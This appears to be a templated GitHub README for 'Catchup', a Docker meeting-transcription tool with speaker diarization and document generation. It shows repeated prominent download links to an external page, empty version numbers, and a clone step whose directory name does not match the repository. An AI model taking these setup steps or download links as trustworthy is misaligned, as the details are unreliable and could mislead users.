# Catchup - AI meeting transcription tool 2026

> **Catchup is a Docker-based AI meeting transcription tool that converts spoken discussions into structured results. The current release includes speaker diarization, live microphone capture, and document creation.**

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/colechrisgk3442/catchup-meeting-notes?style=flat-square)](https://github.com/colechrisgk3442/catchup-meeting-notes)

---

<p align="center">
  <a href="https://colechrisgk3442.github.io/catchup-meeting-notes/">
    <img src="https://img.shields.io/badge/Download-Catchup%20Latest-brightgreen?style=for-the-badge" alt="Download Catchup">
  </a>
</p>

> **[Download Catchup v](https://colechrisgk3442.github.io/catchup-meeting-notes/)**

---

[Download Latest Build](https://colechrisgk3442.github.io/catchup-meeting-notes/)

---

## What Catchup Does

Catchup helps teams and individuals transform meeting conversations into practical text and documents with less manual note-taking. Its AI transcription workflow makes recorded discussions easier to revisit, search, and preserve for future reference.

The application can also identify different speakers, helping organize dialogue in sessions with multiple participants. Live microphone recording and document generation extend the workflow from capturing a conversation through producing structured notes, recaps, and shareable output.

---

## Highlights

- AI-assisted transcription for meetings
- Speaker identification across multi-participant sessions
- Recording directly from a live microphone
- Document creation based on meeting content
- Deployment through Docker
- Designed around meeting notes and summaries
- Supports review, archival records, and follow-up documentation

---

## Getting Started

Retrieve the project and launch its Docker services with the following commands:

    git clone https://github.com/colechrisgk3442/catchup-meeting-notes.git
    cd catchup
    docker compose up -d

For other Docker environments, pull the repository and start the service with the included compose file or with the Docker workflow appropriate for your setup.

---

## Using Catchup

After the container is running, open the application and either begin a live meeting session or provide the audio you want to process. For live capture, choose the appropriate microphone input so Catchup can record the discussion in real time.

A normal session looks like this:

1. Start the Docker service.
2. Record the meeting or supply an existing audio source.
3. Inspect the transcript and speaker assignments.
4. Create a document for sharing or long-term storage.

---

## Setup and Configuration

Most Catchup options are controlled through the Docker configuration and project files included in the repository. When environment variables or compose settings are available, make the required changes before launching the container.

Example pattern:

    # docker-compose.yml or environment file
    TRANSCRIPTION_MODE=meeting
    ENABLE_DIARIZATION=true
    MIC_INPUT=default

Choose values that match your deployment environment and the type of transcription workflow you plan to use.

---

## System Requirements

- Docker
- A machine that can run containerized applications
- Microphone access when using live recording
- Available storage for audio, transcripts, and generated documents
- A compatible browser or local interface for using the application

---

## Frequently Asked Questions

**How can I update Catchup?**  
Pull the newest changes from the repository, then rebuild or restart the Docker container when an updated release or revision is available.

**Where do I modify the application settings?**  
Review the Docker compose configuration, environment variables, and project configuration files provided in the repository.

**What should I check if recording or transcription will not begin?**  
Make sure Docker is active, verify microphone permissions and the selected input, and inspect the container logs for startup errors.

**Does Catchup support meetings with several speakers?**  
Yes. Speaker diarization is included to help distinguish participants and separate their contributions during a meeting.

---

## License

Catchup is licensed under GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
